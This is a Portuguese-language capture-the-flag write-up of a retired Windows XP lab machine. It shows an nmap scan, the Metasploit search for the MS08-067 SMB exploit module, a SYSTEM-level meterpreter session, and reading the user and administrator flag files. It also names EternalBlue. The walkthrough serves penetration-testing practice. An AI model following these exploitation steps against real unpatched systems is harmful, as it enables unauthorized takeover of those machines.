#ctfs 

Primeiro iniciei com um scaneamento via `nmap`para verificar quantas portas TCP temos abertas.

```shell
$ nmap 10.129.227.181 -p- -Pn --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 14:37 -03
Nmap scan report for 10.129.227.181
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 61.96 seconds
```

O que nos dá a primeira resposta.

Logo em seguida pede-se qual o CVE da vulnerabilidade do SMB que permite uma execução de código remota. Após uma breve busca no Google encontramos que se trata do `CVE-2008-4250`

O CTF nos indica que devemos utilizar o metasploit dado o teor da pergunta, portanto, façamos uma busca no Metasploit do módulo utilizado para a exploração desse CVE

```shell
msf > search type:Exploit CVE-2008-4250

Matching Modules
================

   #  Name                                    Disclosure Date  Rank   Check  Description
   -  ----                                    ----------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi     2008-10-28         great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

Isso nos traz a resposta da terceira flag.

O problema quer saber qual usuário está rodando no Windows após a exploração. Basta dar um `getuid` no meterpreter pra termos resposta.

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Vamos atrás da flag do user.txt, basta ir até o diretório do usuário `john`no computador.

```shell
Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19    <DIR>          .
16/03/2017  09:19    <DIR>          ..
16/03/2017  09:19                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.071.616 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
[FLAG user.txt]
```

Próximo passo é conquistar a flag do usuário `Administrator`. Observe que estamos executando o exploit como `NT AUTHORITY\SYSTEM`, ou seja, já temos permissão na pasta do Administrator, basta acessá-la e vitória.

```shell
Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18    <DIR>          .
16/03/2017  09:18    <DIR>          ..
16/03/2017  09:18                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.055.232 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
[FLAG root.txt]
```

Por fim, o CTF nos pede o CVE de 2017 que infecta o SMB. Trata-se do EternalBlue (CVE-2017-0143).